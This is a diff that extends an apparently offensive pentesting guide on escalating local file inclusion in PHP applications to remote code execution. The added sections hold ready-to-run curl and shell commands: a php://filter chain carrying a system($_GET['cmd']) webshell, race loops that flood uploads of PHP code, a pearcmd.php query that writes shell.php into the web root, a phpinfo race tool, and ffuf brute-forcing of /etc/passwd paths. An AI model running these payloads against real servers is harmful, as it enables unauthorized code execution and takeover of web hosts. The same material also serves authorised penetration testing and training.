@@ -286,15 +286,107 @@ If you can upload a file anywhere on the server (avatar, attachment, temp file),
 curl -s "http://$TARGET/page?file=../../uploads/shell.jpg&cmd=id"
 ```
 
+## PHP Filter Chain RCE
+
+The most powerful modern LFI escalation: generates a PHP payload using chained `php://filter` conversions, achieving RCE with no `allow_url_include`, no writable path, and no upload required. Works on any PHP app where the LFI parameter reaches `include()`.
+
+```bash wrap
+# Install
+git clone https://github.com/synacktiv/php_filter_chain_generator
+cd php_filter_chain_generator
+
+# Generate a filter chain that outputs your PHP payload
+python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
+
+# The tool outputs a full php://filter/... string — pass it directly as the file parameter
+curl -s "http://$TARGET/page?file=php://filter/convert.iconv.../resource=php://temp&cmd=id"
+```
+
+The chain encodes arbitrary bytes into the `php://filter` conversion pipeline so the PHP interpreter assembles your payload from character-encoding artifacts rather than from any file on disk.
+
+## Nginx Temp File Inclusion
+
+When file uploads go through Nginx, the multipart body is written to a temp file at `/tmp/phpXXXXXX` before the PHP process reads it. Race the include against the temp file window.
+
+```bash wrap
+# In one terminal: repeatedly send a multipart upload containing PHP code
+while true; do
+  curl -s -F "file=<?php system(\$_GET['cmd']); ?>" http://$TARGET/upload.php &
+done
+
+# In another terminal: race the LFI against /tmp/phpXXXXXX
+while true; do
+  for i in $(cat /proc/sys/kernel/random/uuid | tr -d '-' | fold -w6 | head -5); do
+    curl -s "http://$TARGET/page?file=/tmp/php$i&cmd=id" | grep -v "failed\|No such"
+  done
+done
+```
+
+In practice, use [Nginx-temp-file-LFI](https://github.com/Raz0r/nginx-temp-file-lfi) for automated exploitation of this race.
+
+## pearcmd.php (register_argc_argv)
+
+If `register_argc_argv = On` in `php.ini` (common in Docker-based PHP images), `/usr/local/lib/php/pearcmd.php` can be abused via query string to write files.
+
+```bash wrap
+# Confirm pearcmd is reachable
+curl -s "http://$TARGET/page?file=/usr/local/lib/php/pearcmd.php"
+
+# Use PEAR's config-create to write a webshell to a web-accessible path
+curl -s "http://$TARGET/page?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?php system(\$_GET[cmd]);?>+/var/www/html/shell.php"
+
+# Execute via the written shell
+curl -s "http://$TARGET/shell.php?cmd=id"
+```
+
+The query string is parsed as `$argv` when `register_argc_argv` is on, so PEAR's CLI commands execute server-side.
+
+## phpinfo() Race Condition
+
+When a page exposes `phpinfo()`, it reveals the exact temp file path of any concurrent file upload before PHP cleans it up. Race the include against that temp path.
+
+```bash wrap
+# Requires: phpinfo() page accessible + LFI + file upload endpoint
+
+# 1. Find the phpinfo page (common paths)
+curl -s http://$TARGET/phpinfo.php
+curl -s http://$TARGET/info.php
+curl -s http://$TARGET/test.php
+
+# 2. Use the phpinfoprobe + LFI race tool
+# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/phpinfolfi.py
+python2 phpinfolfi.py $TARGET 80 /phpinfo.php /page.php 100
+```
+
+## Escalation Decision Guide
+
+| What you have | Best path |
+|---------------|-----------|
+| LFI only, PHP app | PHP filter chain RCE (no deps) |
+| LFI + file upload | Upload PHP shell, include the uploaded file |
+| LFI + writable log + no shell filter | Log poisoning via User-Agent |
+| LFI + SSH access | SSH auth log poisoning |
+| LFI + `allow_url_include` | `php://input` or `data://` |
+| LFI + phpinfo() page | phpinfo() race condition |
+| LFI + Nginx + file upload | Nginx temp file race |
+| LFI + `register_argc_argv` | pearcmd.php write |
+| LFI + PHP session stored | Session file inclusion |
+| LFI + zip/phar upload | zip:// or phar:// wrapper |
+
 ## Automation
 
 ```bash wrap
-# LFI Suite / ffuf for path brute-force
+# Path brute-force with ffuf
 ffuf -u "http://$TARGET/page?file=FUZZ" \
   -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
   -fw 0 -mc 200
 
-# kadimus (LFI exploitation tool)
+# Traversal depth brute-force
+ffuf -u "http://$TARGET/page?file=FUZZ/etc/passwd" \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
+  -mc 200 -fw 0
+
+# kadimus
 kadimus -u "http://$TARGET/page?file="
 
 # liffy
